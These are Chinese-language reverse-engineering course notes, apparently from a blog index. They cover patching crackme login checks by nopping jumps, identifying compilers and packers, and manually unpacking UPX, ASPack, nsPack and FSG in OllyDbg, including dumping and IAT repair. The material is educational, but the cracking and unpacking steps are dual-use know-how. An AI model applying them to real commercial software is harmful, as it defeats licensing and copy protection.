         add ebx,eax\n00401314  |. |895D F4       mov [local.3],ebx\n00401317  |. |8B5D F4       mov ebx,[local.3]\n0040131A  |. |FF33          push dword ptr ds:[ebx]\n0040131C  |. |68 442C4800   push 课件3_易.00482C44                      ;  到期时间：\n00401321  |. |B9 02000000   mov ecx,0x2\n00401326  |. |E8 01FEFFFF   call 课件3_易.0040112C\n```\n\n分析算法：与2.4一样，只是没了加密过程。\n\n## 2.4 EXE加密验证\n\n爆破与2.3一样。\n\n分析算法：\n\n开头同2.1，F8一步步跟踪。\n\n```asm\n00401E6E  |.  E8 ED250000   call 课件4_易.00404460                      ;  获取输入的用户名\n```\n\n```asm\n00401EC2  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  base64加密用户名：YWJj\n```\n\n```asm\n00401EE6  |.  E8 75250000   call 课件4_易.00404460                      ;  获取输入的密码\n```\n\n```asm\n00401F3A  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  密码base64加密:MTIz\n```\n\n```asm\n00401F68  |.  8945 E0       mov [local.8],eax                        ;  拼接：YWJj|MTIz\n```\n\n经过`retn`后F9运行，程序又回到断点处。这次F7进去代码与之前不同。\n\n```asm\n00401B42  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误\n```\n\n```asm\n00401B6B  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误\n```\n\n```asm\n00401C47  |.  68 CD6E4800   push 课件4_易.00486ECD                      ;  【登录成功】\n```\n\n```asm\n00401C59  |.  83F8 00       cmp eax,0x0                              ;  登录成功和登录失败相比较\n00401C5C      0F85 99000000 jnz 课件4_易.00401CFB                       ;  nop掉\n```\n\n## 2.5 EXE加密验证2.0\n\n```asm\n004013C4     /0F85 CC020000 jnz 课件5_易.00401696\n```\n\n```asm\n0040147F  |. /0F8C D0010000 jl 课件5_易.00401655\n```\n\n```asm\n004014CE  |. /0F8E 99000000 jle 课件5_易.0040156D\n```\n\n把这三处都nop掉即可。\n\n## 2.6 可可 v9.5\n\n程序无壳，放心食用。调试选项全选，StrongOD勾选忽略某些异常。下易语言按钮事件断点`FF 55 FC 5F 5E`。运行，输入账号密码，点击登录。取消断点，F7跟进，一路F8，注意堆栈窗口。\n\n```asm\n00405776   .  E8 D9460000   call 第七课作.00409E54                       ;  获取输入的用户名\n```\n\n```asm\n004057C8   .  E8 87460000   call 第七课作.00409E54                       ;  获取输入的密码\n```\n\n```asm\n00405992   . /0F84 7F000000 je 第七课作.00405A17                         ;  要跳\n00405998   . |8D45 F8       lea eax,dword ptr ss:[ebp-0x8]\n0040599B   . |50            push eax\n0040599C   . |E8 A4BEFFFF   call 第七课作.00401845                       ;  账号未找到\n```\n\n```asm\n00405AB9   . /0F84 FE000000 je 第七课作.00405BBD                         ;  要跳\n...\n00405B63   .  68 04000080   push 0x80000004\n00405B68   .  6A 00         push 0x0\n00405B6A   .  68 14C65500   push 第七课作.0055C614                       ;  err\n00405B6F   .  68 04000080   push 0x80000004\n00405B74   .  6A 00         push 0x0\n00405B76   .  68 18C65500   push 第七课作.0055C618                       ;  signdata\n00405B7B   .  68 04000080   push 0x80000004\n```\n\n改变两个跳转后，F8到这，卡住，暂停+运行，程序弹出不断弹出“用户身份未校验”，还弹出了一个“暗桩”。\n\n```asm\n00405F78   .  E8 D13E0000   call 第七课作.00409E4E\n```\n\n救命啊我不会！！！\n\n----------------------------------\n\n跟进继续F8，到这又回到按钮事件。重载，跟进这个函数。\n\n```asm\n004087E7  |.  E8 8B030000   call 第七课作.00408B77\n```\n\n发现跟进这个函数里面的`408C3F`的call指令又回到按钮事件。\n\n```\n00408C3F  |.  E8 D2D6FFFF   call 第七课作.00406316   \n```\n\n跟进这个函数里面的`4063FF`的call指令又回到按钮事件。\n\n```asm\n004063FF  |.  E8 0DB3FFFF   call 第七课作.00401711\n```\n\n\n\n```\n004087CC  |.  6A FF         push -0x1\n004087CE  |.  6A 08         push 0x8\n004087D0  |.  68 7A6B0116   push 0x16016B7A\n004087D5  |.  68 2B010152   push 0x5201012B\n004087DA  |.  E8 63160000   call 第七课作.00409E42\n004087DF  |.  83C4 18       add esp,0x18\n004087E2  |.  68 00000000   push 0x0\n004087E7  |.  E8 8B030000   call 第七课作.00408B77                       ;  暗桩call，跟进\n004087EC  |.  68 01000000   push 0x1\n004087F1  |.  E8 81030000   call 第七课作.00408B77\n```\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第一课——脱壳基础","url":"/posts/e2d652c5.html","content":"# 1. 程序是什么语言编译的\n\n从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。\n\n<!--more-->\n\n## 1.1 VC6\n\n{% asset_img VC6.png VC6 %}\n\n```asm\n00401700 >/$  55            push ebp\n00401701  |.  8BEC          mov ebp,esp\n00401703  |.  6A FF         push -0x1\n00401705  |.  68 00254000   push 吾爱破解.00402500\n```\n\nVC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能会有所不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。\n\n## 1.2 VS2008与VS2013\n\n{% asset_img VS2008.png VS2008 %}\n\n```asm\n00B5DDAC > $  E8 EF4E0000   call 吾爱破解.00B62CA0\n00B5DDB1   .^ E9 79FEFFFF   jmp 吾爱破解.00B5DC2F\n```\n\n{% asset_img VS2013.png VS2013 %}\n\n```asm\n00B03359 > $  E8 A9520000   call 吾爱破解.00B08607\n00B0335E   .^ E9 7FFEFFFF   jmp 吾爱破解.00B031E2\n```\n\n```asm\n00B08607  /$  55            push ebp\n00B08608  |.  8BEC          mov ebp,esp\n```\n\nVS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。\n\n## 1.3 易语言\n\n易语言编译无壳程序分为独立编译和非独立编译。由于易语言**独立编译**是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，用exeinfoPE查壳也显示是VC6编译的。而**非独立编译**却显示不知名EXE，可能查壳工具里面没有存易语言非独立编译的特征码吧。\n\n{% asset_img 易语言非独立编译.png 易语言非独立编译 %}\n\n{% asset_img 易语言.png 易语言 %}\n\n易语言特点：从程序里找一些call调用，最终都会走到上面位置（文字不太好表达），这个方法可以区分易语言和VC，非独立编译比较容易识别，入口处和`E`模块都可以找到`krnln.fnr`。\n\n```asm\n00401000 >/$  E8 89000000                                        call 吾爱破解.0040108E\n00401005  |.  50                                                 push eax                                 ; /ExitCode = 0x0\n00401006  \\.  E8 B5010000                                        call <jmp.&KERNEL32.ExitProcess>         ; \\ExitProcess\n0040100B   .  47 65 74 4E 65 77 53 6F 63 6B 00                   ascii \"GetNewSock\",0\n00401016   .  45 72 72 6F 72 00                                  ascii \"Error\",0\n0040101C   .  6B 72 6E 6C 6E 2E 66 6E 65 00                      ascii \"krnln.fne\",0\n00401026   .  4E 6F 74 20 66 6F 75 6E 64 20 74 68 65 20 6B 65    ascii \"Not found the ke\"\n00401036   .  72 6E 65 6C 20 6C 69 62 72 61 72 79 20 6F 72 20    ascii \"rnel library or \"\n00401046   .  74 68 65 20 6B 65 72 6E 65 6C 20 6C 69 62 72 61    ascii \"the kernel libra\"\n00401056   .  72 79 20 69 73 20 69 6E 76 61 6C 69 64 21 00       ascii \"ry is invalid!\",0\n00401065   .  6B 72 6E 6C 6E 2E 66 6E 72 00                      ascii \"krnln.fnr\",0\n0040106F   .  50 61 74 68 00                                     ascii \"Path\",0\n00401074   .  53 6F 66 74 77 61 72 65 5C 46 6C 79 53 6B 79 5C    ascii \"Software\\FlySky\\\"\n00401084   .  45 5C 49 6E 73 74 61 6C 6C 00                      ascii \"E\\Install\",0\n0040108E  /$  55                                                 push ebp\n0040108F  |.  8BEC                                               mov ebp,esp\n00401091  |.  81C4 F0FEFFFF                                      add esp,-0x110\n00401097  |.  8D85 FCFEFFFF                                      lea eax,[local.65]\n0040109D  |.  50                                                 push eax\n0040109E  |.  E8 41010000                                        call 吾爱破解.004011E4\n004010A3  |.  68 65104000                                        push 吾爱破解.00401065                       ; /StringToAdd = \"krnln.fnr\"\n004010A8  |.  8D85 FCFEFFFF                                      lea eax,[local.65]                       ; |\n004010AE  |.  50                                                 push eax                                 ; |ConcatString = NULL\n004010AF  |.  E8 24010000                                        call <jmp.&KERNEL32.lstrcatA>            ; \\lstrcatA\n```\n\n## 1.4 Delphi\n\n{% asset_img Delphi.png Delphi %}\n\nDelphi特点：非常多的call指令，并且`push address`与`retn`结合相当于`jmp address`。比如：\n\n```asm\npush 004A52F4\n……\nretn\t\t\t\t\t\n;相当于jmp 004A52F4\n```\n\n## 1.5 BC++\n\n{% asset_img BC++6.png BC++6 %}\n\n{% asset_img BC++2010.png BC++2010 %}\n\nBC++6与BC++2010都差不多，入口处一样的机器码，接下来调用获取句柄的API函数。\n\n```asm\n004014EC > $ /EB 10         jmp short 吾爱破解.004014FE\n004014EE     |66            db 66                                    ;  CHAR 'f'\n004014EF     |62            db 62                                    ;  CHAR 'b'\n004014F0     |3A            db 3A                                    ;  CHAR ':'\n004014F1     |43            db 43                                    ;  CHAR 'C'\n004014F2     |2B            db 2B                                    ;  CHAR '+'\n004014F3     |2B            db 2B                                    ;  CHAR '+'\n004014F4     |48            db 48                                    ;  CHAR 'H'\n004014F5     |4F            db 4F                                    ;  CHAR 'O'\n004014F6     |4F            db 4F                                    ;  CHAR 'O'\n004014F7     |4B            db 4B                                    ;  CHAR 'K'\n004014F8     |90            nop\n004014F9     |E9            db E9\n004014FA   . |ACB04C00      dd offset 吾爱破解.___CPPdebugHook\n004014FE   > \\A1 9FB04C00   mov eax,dword ptr ds:[0x4CB09F]\n00401503   .  C1E0 02       shl eax,0x2\n00401506   .  A3 A3B04C00   mov dword ptr ds:[0x4CB0A3],eax\n0040150B   .  52            push edx                                 ;  吾爱破解.<ModuleEntryPoint>\n0040150C   .  6A 00         push 0x0                                 ; /pModule = NULL\n0040150E   .  E8 578F0C00   call <jmp.&KERNEL32.GetModuleHandleA>    ; \\GetModuleHandleA\n```\n\n## 1.6 ASM\n\n{% asset_img ASM.png ASM %}\n\n```asm\n0040108B >/$  6A 00            push 0x0                                 ; /pModule = NULL\n0040108D  |.  E8 4A000000      call <jmp.&kernel32.GetModuleHandleA>    ; \\GetModuleHandleA\n```\n\nASM特点：用汇编编写的程序都非常小，基本很少遇到，但它可用于改变自身代码，某些病毒就是利用多态和变形的特点隐藏自身。具体可见《OD使用教程》中的多态和变形。\n\n## 1.7 .NET\n\n{% asset_img NET.png NET %}\n\n.NET编译的程序放在OD调试会出现错误，推荐使用专门的net反编译工具。 \n\n{% asset_img NET_OD.png NET_OD %}\n\n## 1.8 AutoIt\n\n{% asset_img AutoIt.png AutoIt %}\n\n在OD中文搜索引擎可以看到它是用AutoIt v3编译的。\n\n```\n中文搜索引擎, 条目 504\n 地址=0014A9F1\n 反汇编=push 吾爱破解.001E26A8\n 文本字符串=AutoIt v3 GUI\n```\n\n## 1.9 PB\n\n{% asset_img PB.png PB %}\n\nPB可能也是跟易语言的独立编译一样，调用VC的链接程序编译，所以才显示VC6。但它还另加了两个库：`libjcc.dll`和`pbvm90.dll`。\n\n```asm\nExecutable modules\n基址       大小       入口       名称       文件版本          路径\n009E0000   0007C000   00A10640   libjcc     4.2.5.06          F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\libjcc.dll\n10000000   0000B000   10001B30   吾爱破解       1,0,0,1           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\吾爱破解论坛学习脱壳实例_PB.exe\n10B00000   003F3000   10DB9000   pbvm90     9.0.3.8784        F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\pbvm90.dll\n```\n\n## 1.10 QT\n\n{% asset_img QT.png QT %}\n\n查壳可看到QT编译，并且OD的`E`模块也看到了有关QT的库。\n\n```asm\nExecutable modules\n基址       大小       入口       名称       文件版本          路径\n00400000   0000D000   004014C0   52pojie    0.0.0.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\52pojie.exe\n01090000   00633000   01091420   Qt5Widge   5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Widgets.dll\n016D0000   002AD000   016D1420   icuin53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icuin53.dll\n61940000   00505000   61941420   Qt5Gui     5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Gui.dll\n64940000   00014000   64941420   libwinpt   1, 0, 0, 0        F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libwinpthread-1.dll\n66500000   01499000   66501420   icudt53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icudt53.dll\n68430000   0003F000   68462D70   glu32      10.0.19041.1288   C:\\Windows\\SysWOW64\\glu32.dll\n68880000   004A6000   68881420   Qt5Core    5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Core.dll\n68F80000   001B3000   68F81420   icuuc53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icuuc53.dll\n694A0000   00103000   69573D60   opengl32   10.0.19041.1081   C:\\Windows\\SysWOW64\\opengl32.dll\n6C640000   0009F000   6C678870   apphelp    10.0.19041.1288   C:\\Windows\\SysWOW64\\apphelp.dll\n6E940000   00024000   6E941420   libgcc_s                     F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libgcc_s_dw2-1.dll\n6FC40000   00101000   6FC41420   libstdc+                     F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libstdc++-6.dll\n```\n\n## 1.11 VB\n\n```asm\n0040129A  - FF25 AC104000   jmp dword ptr ds:[<&msvbvm60.#ThunRTMain_100>]            ; msvbvm60.ThunRTMain\n004012A0 >  68 582E4000     push dumped_.00402E58\n004012A5    E8 F0FFFFFF     call <jmp.&msvbvm60.#ThunRTMain_100>\n```\n\n\n\n# 2. 如何判断是否加壳\n\n1. 通过查壳工具中内置各种壳的十六进制特征码进行对比查壳\n2. 通过程序入口特征与区段信息来判断\n\n# 3. 程序加的是什么壳\n\n未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net程序加密...\n\n## 3.1 压缩壳\n\n尽量减少可执行文件的大小。\n\n### 3.1.1 ASPacK\n\n{% asset_img ASPacK.png ASPacK %}\n\n```asm\n00803001 >  60              pushad\n```\n\n看到`m`模块，除了最基本VS编译特点的区段，ASPacK壳还加了`.aspack`与`.adata`模块，这两个模块都可以在加壳时自定义名字。\n\n```asm\nMemory map\n地址       \t大小       属主      \t 区段       包含                         类型   访问     初始访问  已映射为\n007B0000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE\n007B1000   00031000   吾爱破解       .text      代码                         \tImag   R       RWE\n007E2000   0000D000   吾爱破解       .rdata     数据                          Imag   R       RWE\n007EF000   00007000   吾爱破解       .data                                   Imag   R         RWE\n007F6000   00004000   吾爱破解       .rsrc      资源                          Imag   R       RWE\n007FA000   00009000   吾爱破解       .reloc                                  Imag   R         RWE\n00803000   00003000   吾爱破解       .aspack    SFX,输入表                    Imag   R         RWE\n00806000   00001000   吾爱破解       .adata                                  Imag   R         RWE\n```\n\n### 3.1.2 UPX\n\n{% asset_img UPX.png UPX %}\n\n```asm\n00287170 > $  60            pushad\n```\n\n## 3.2 加密壳\n\n抵抗各类调试器和逆向，可能会加入大量干扰代码。\n\n### 3.2.1 Themida\n\n{% asset_img Themida.png Themida %}\n\n从查壳工具看到它有个区段没名字，并且最后两段是随机名称。而且它与其他加壳的入口处不一样，不是`pushad`而是三个push\n\n```asm\n00AC4000 >  56              push esi                                 ; 吾爱破解.<ModuleEntryPoint>\n00AC4001    50              push eax\n00AC4002    53              push ebx\n00AC4003    E8 01000000     call 吾爱破解.00AC4009\n00AC4008    CC              int3\n```\n\n但F8运行一段后也是可以发现有`pushad`\n\n```asm\n008BC76D    89E8            mov eax,ebp\n008BC76F    89E2            mov edx,esp\n008BC771    60              pushad\n008BC772    E8 00000000     call 吾爱破解.008BC777\n```\n\n### 3.2.2 VMProtect\n\n{% asset_img VMProtect.png VMProtect %}\n\n可看VMProtect有很多个段，一些段的首字节显示`ZERO SIZE`。载入OD代码看起来也很乱\n\n```asm\n007433CC    E8 F6EFFCFF     call 吾爱破解.007123C7\n007433D1    48              dec eax\n007433D2    DE1F            ficomp word ptr ds:[edi]\n007433D4    ff5e 43         call far fword ptr ds:[esi+0x43]\n007433D7    29F0            sub eax,esi\n007433D9    3950 3F         cmp dword ptr ds:[eax+0x3F],edx          ; 吾爱破解.00610000\n007433DC    16              push ss\n007433DD    17              pop ss\n007433DE    F8              clc\n```\n\n进入第一个函数可以看到类似于加密的`pushfd`标志吧。\n\n```asm\n007123C7    9C              pushfd\n007123C8    9C              pushfd\n007123C9    C74424 08 1F660>mov dword ptr ss:[esp+0x8],0xA00A661F\n007123D1    9C              pushfd\n007123D2    E9 B58D0000     jmp 吾爱破解.0071B18C\n```\n\n### 3.2.3 Shielden\n\n{% asset_img Shielden.png Shielden %}\n\n```asm\n0050B119 > $ /EB 08         jmp short 吾爱破解.0050B123\n0050B11B     |00            db 00\n0050B11C     |C8            db C8\n0050B11D     |10            db 10\n0050B11E     |00            db 00\n0050B11F     |00            db 00\n0050B120     |00            db 00\n0050B121     |00            db 00\n0050B122     |00            db 00\n0050B123   >^\\E9 E5F2FFFF   jmp 吾爱破解.0050A40D\n0050B128   .  1978 5B       sbb dword ptr ds:[eax+0x5B],edi          ;  吾爱破解.<ModuleEntryPoint>\n0050B12B   >  0f93c3        setae bl\n0050B12E   .  FEC1          inc cl\n0050B130   .  8BDE          mov ebx,esi                              ;  吾爱破解.<ModuleEntryPoint>\n0050B132   .  60            pushad\n0050B133   .  F6DF          neg bh\n```\n\nF8走几下，也能看到明显的Shielden加壳特征。\n\n```asm\n0050A40D   > /E8 1C000000   call 吾爱破解.0050A42E                       ;  PUSH ASCII \"Safengine Shielden v2.3.6.0\"\n0050A412   . |53 61 66 65 6>ascii \"Safengine Shield\"\n0050A422   . |65 6E 20 76 3>ascii \"en v2.3.6.0\",0\n0050A42E   > |9C            pushfd\n```\n\n# 4. 脱壳详解\n\n以下脱壳都是用吾爱专用虚拟机进行操作，因为Win7/8/10(以后仅称Win10)脱壳太不友好，导致各种各样的问题出现。比如Win10系统下LoadPE只显示系统进程、脱壳后的程序无法正常运行(原因是ASLR基地址随机化脱壳插件获取的地址不对)，这些问题在XP系统都可以得到解决。\n\n脱壳后的程序回到Win10运行不了的问题，也是因为ASLR基地址随机化。ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。\n\n在XP虚拟机用LoadPE和Scylla结合脱壳后的程序，移到Win10就打不开的情况(点击后加载了一下主程序却没出来)。OD载入看看\n\n```asm\n00F42CA0    8BFF            mov edi,edi                              ; dumped_S.<ModuleEntryPoint>\n00F42CA2    55              push ebp\n00F42CA3    8BEC            mov ebp,esp\n00F42CA5    83EC 10         sub esp,0x10\n00F42CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]\n```\n\n下面是XP系统同一代码位置的情况\n\n```asm\n00422CA0    8BFF            mov edi,edi\n00422CA2    55              push ebp\n00422CA3    8BEC            mov ebp,esp\n00422CA5    83EC 10         sub esp,0x10\n00422CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]\n```\n\n发现第5行都是`4407B0`，肯定不对，推测在Win10下这个偏移地址为`F607B0`(这个地址还会变，因为每次载入程序地址都会随机化)。为了让程序能在Win10正常运行，只需将文件或系统的ASLR取消即可。最好不要取消系统的ASLR，涉及安全问题。\n\n取消文件的ASLR的两种方法：\n\n1. 打开LoadPE->PE编辑器->特征值后面三个点->将重定位已分离勾选->确定->保存->确定\n2. 打开CFF Explorer->载入文件->File Header->Click Here->将`relocation info stripped from file`勾选->OK\n\n在XP中取消再移到Win10或直接在Win10取消都行。\n\n## 4.1 UPX\n\n做作业前推荐观看ximo脱壳基础——手脱UPX壳\n\n{% asset_img hw_UPX.png hw_UPX %}\n\n用ExeinfoPE查壳可知它是UPX壳，并且可以知道区段的名字可以随意改变，所以用区段名字判断它是什么壳其实不准确。UPX脱壳非常简单，只需利用UPX脱壳工具即可。\n\n```\nD:\\CTF\\tools\\upx>upx -d 吾爱破解培训第一课作业一.exe -o 1.exe\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2020\nUPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\nupx: 吾爱破解培训第一课作业一.exe: CantUnpackException: file is modified/hacked/protected; take care!!!\n\nUnpacked 0 files.\n```\n\n呃...脱壳工具好鸡肋，看了ximo的手脱UPX壳，现在4种方法都来试试吧。\n\n### 4.1.1 单步跟踪法\n\n一路F8，遇到向上跳转不实现，向下跳转忽略。\n\n遇到向上跳转时，有两种方法饶过：\n\n1. 选中向上跳转指令的下一条指令F4(运行至光标处)\n2. 选中向上跳转指令的下一条指令F2->F9->F2(下断点->运行->取消断点)\n\n如果向上跳转的下一条指令是跳转指令或是call指令，那就在下下一条指令进行操作，以此类推。\n\n```asm\n00F87757    61              popad\n00F87758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]\n00F8775C    6A 00           push 0x0\n00F8775E    39C4            cmp esp,eax\n00F87760  ^ 75 FA           jnz short 吾爱破解.00F8775C\n00F87762    83EC 80         sub esp,-0x80\n00F87765  - E9 4266FCFF     jmp 吾爱破解.00F4DDAC\n```\n\n经过漫长的上述重复操作后，终于来到了第7行的大跳转处，大跳转在加壳程序中往往意味着OEP(注意第1行的popad，其它方法会用到)。\n\n```asm\n00F4DDAC    E8 EF4E0000     call 吾爱破解.00F52CA0\n00F4DDB1  ^ E9 79FEFFFF     jmp 吾爱破解.00F4DC2F\n00F4DDB6    3B0D B007F700   cmp ecx,dword ptr ds:[0xF707B0]\n```\n\n以上就是真正程序的起始处，结合1所学的各种语言编译后代码的特点，猜测该程序是由VS编译的。\n\n### 4.1.2 ESP定律\n\n入口代码第1行是`pushad`，经过这一条指令后，在寄存器的ESP右键->数据窗口中跟随，来到数据窗口，选中第一个hex数据右键->断点->硬件访问->Word(或者在命令窗口输入`hr esp`回车)，F9运行，取消硬件断点，之后就按照4.1.1的方法走，一直走到OEP。\n\n### 4.1.3 2次内存镜像法\n\n`M`模块查看内存，找到程序领空的`.rsrc`表，也就是资源表。虽然吾爱把表名改了，但还是可以在包含里看到“资源”字样，就在`.cn`处。这里注意，如果资源表是单独一个，就用2次内存镜像，如果与其他表合在一起，只用1次内存镜像即可。\n\n```asm\nMemory map\n地址         大小       属主           区段       包含                         类型   访问    初始访问  已映射为\n00160000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE\n00161000   00039000   吾爱破解           www.                                Imag   R         RWE\n0019A000   0001E000   吾爱破解       52pojie    SFX,代码                      Imag   R         RWE\n001B8000   00005000   吾爱破解            .cn   数据,输入表,资源               Imag   R         RWE\n```\n\n①如果`.rsrc`单独一个节，选中`.rsrc`右键->在访问上设置中断->F9。再找一次内存，在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。\n\n②如果`.rsrc`并不是单独一个节，只需在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。\n\n之后按照4.1.1的方法走。\n\n### 4.1.4 一步直达法\n\n绝大部分UPX壳和AsPack壳都可以用这种方法。载入OD后可直观看到`pushad`，既然有`pushad`那肯定有`popad`。右键->查找->命令，输入`popad`，不需要勾选整个块。之后与4.1.1同。\n\n在虚拟机的OD找到OEP后，三种方法dump下来。\n\n①用OllyDump插件，起始地址是`E`模块的第一行的`00400000`，大小为`5D000`，OEP的地址为`0041DDAC`，修正的是偏移地址，所以是`0041DDAC-00400000=1DDAC`，代码基址和数据基址可以在`M`模块看，代码基址是`3A000`，数据基址是`58000`。用方式1脱壳，保存为`ODdump1.exe`，可以运行，载入exeinfoPE说有不知名的壳在保护，但点一下插件Advanced Scan就可看到是由VS2008编译的。\n\n{% asset_img ODdump1.jpg ODdump1 %}\n\n在PEID可以直接看到是由VS2008编译的。\n\n{% asset_img ODdump11.jpg ODdump11 %}\n\n`ODdump1.exe`载入OD后还是显示有压缩代码的存在。\n\n{% asset_img ODdump12.jpg ODdump12 %}\n\n那UPX壳到底有没有脱干净呢？其实只要脱壳后的程序可以正常运行，OEP入口代码为无壳代码特征，IAT解密完资源没有被压缩即可。 \n\n②用OllyDump插件，与①完全相同，只是用方式2脱壳，保存为`ODdump2.exe`，不可运行。\n\n{% asset_img ODdump2.jpg ODdump2 %}\n\n③打开LoadPE，找到OD进程，右键->修复镜像大小->右键->完整转存，将正在调试的程序完整地转存下来，自动生成一个`dumped.exe`文件，不可运行，壳还没脱。**注意，先别关掉OD。**打开ImportREC，找到原本的程序(不是`dumped.exe`)，将OEP改为`1DDAC`->自动查找IAT->获取输入表，没有无效函数，转储到文件，选中`dumped.exe`打开，会自动生成一个`dumped_.exe`。这时，`dumped_.exe`可以运行。\n\n{% asset_img dumped.jpg dumped %}\n\n{% asset_img dumped1.jpg dumped1 %}\n\n{% asset_img dumped_.jpg dumped_ %}\n\n## 4.2 ASPacK\n\n{% asset_img ASPacK.png ASPacK %}\n\nASPacK壳都可以用以上4种方法。现在用单步跟踪法温故知新。F8运行到第2行主程序就出来了，也就是我们所说的“跑飞了”。所以要F7跟进去，以后同理。\n\n```asm\n00430001 >  60              pushad\n00430002    E8 03000000     call QQ个性网.0043000A\n00430007  - E9 EB045D45     jmp 45A004F7\n```\n\n单步跟踪法与F7、F8结合，运行至`retn`指令后出来的就是真正程序开始的地方。\n\n在一步直达法查找`popad`时会遇到很多个`popad`可能都不是我们需要的，在不知道哪个是我们所要的`popad`情况下，最好不要用这种方法。\n\n### 4.2.1 模拟跟踪法\n\n模拟跟踪法包括SFX模拟跟踪都是让OD自动查找程序OEP。\n\n`M`模块，在程序领空找到包含SFX的区段的地址。在命令窗口输入`tc eip < 包含SFX的区段的地址`回车，OD会自动跟踪OEP，但这个过程可能会有点漫长。跟踪完后OD会跳到`C`模块的某条指令上，这条指令可能是OEP，也可能是将要到OEP，需要单步跟踪到达OEP。\n\n### 4.2.2 SFX模拟跟踪\n\n选项->调试设置->SFX，选块方式跟踪或字节方式跟踪，视情况而定。重载后自动跳到OEP或将要到OEP处。\n\n## 4.3 nsPack\n\n{% asset_img nsPack.png nsPack %}\n\nnsPack壳是北斗的壳，可以用上面6种方法手动脱壳，过程与脱ASPacK壳一样。\n\nnsPack壳作业用①方法用PEID查壳第一行Unknown，第二行显示VS2008，程序正常运行，载入OD也正常。用②方法查壳同①，程序不能正常运行，错误提示“应用程序正常初始化(0xc0000005)失败”，这时用importREC自动查找IAT就可正常运行，载入OD正常。用③方法全部同①。\n\n## 4.4 FSG 2.0\n\n{% asset_img FSG.png FSG %}\n\n### 4.4.1 单步跟踪法\n\n单步跟踪到这三个连续跳转处，第1行代码向上跳，绕过。第2行代码跳到1D4地址处，刚好绕过第3行的大跨度跳转。\n\n```asm\n004001CD  ^\\78 F3           js short qqspirit.004001C2\n004001CF    75 03           jnz short qqspirit.004001D4\n004001D1  - FF63 0C         jmp dword ptr ds:[ebx+0xC]               ; qqspirit.0040A86D\n004001D4    50              push eax                                 ; qqspirit.0042CBC6\n```\n\n选中1D1地址，F4运行至此处。F8就跳到了OEP。\n\n### 4.4.2 ESP定律\n\n在程序起始处执行到的第一个`push`指令后，用ESP定律法。\n\n```asm\n00400154 >  8725 04A24700   xchg dword ptr ds:[0x47A204],esp\n0040015A    61              popad\n0040015B    94              xchg eax,esp\n0040015C    55              push ebp\n0040015D    A4              movs byte ptr es:[edi],byte ptr ds:[esi]\n```\n\n之后同单步跟踪。\n\n### 4.4.3 特殊的ESP定律\n\nFSG 2.0专用的ESP定律。\n\n```asm\n00400154 >  8725 04A24700   xchg dword ptr ds:[0x47A204],esp\n0040015A    61              popad\n0040015B    94              xchg eax,esp\n```\n\n执行到`popad`后(程序起始处就有`popad`而没有`pushad`)，查看堆栈窗口。\n\n```asm\n0047A208   004001E8  qqspirit.004001E8\n0047A20C   004001DC  qqspirit.004001DC\n0047A210   004001DE  qqspirit.004001DE\n0047A214   0040A86D  qqspirit.0040A86D\n```\n\n顺数第4行就是OEP。选中右键->在反汇编窗口中跟随，发现在反汇编窗口全是空代码，右键->断点->硬件执行，F9运行(或Shift+F9)即可看到代码。如果反汇编窗口中还是看到类似于数据的东西，右键->分析->从模块中删除分析就可看到代码了。\n\n用脱壳的三种方法脱壳后程序查壳都显示完美脱壳了，是由V6编译的。\n\n{% asset_img fsgoddump1.jpg fsgoddump1 %}\n\n然而三个都不能正常运行，那可能需要我们手动修复IAT。在真正程序段随便找一个call或mov系统函数的偏移地址，比如425210，它的函数名`kernel32.GetVersion`。\n\n```asm\n0040A86D  /.  55            push ebp                                 ;  oleaut32.770F0000\n0040A86E  |.  8BEC          mov ebp,esp\n0040A870  |.  6A FF         push -0x1\n0040A872  |.  68 78794200   push qqspirit.00427978\n0040A877  |.  68 F4E14000   push qqspirit.0040E1F4                   ;  SE 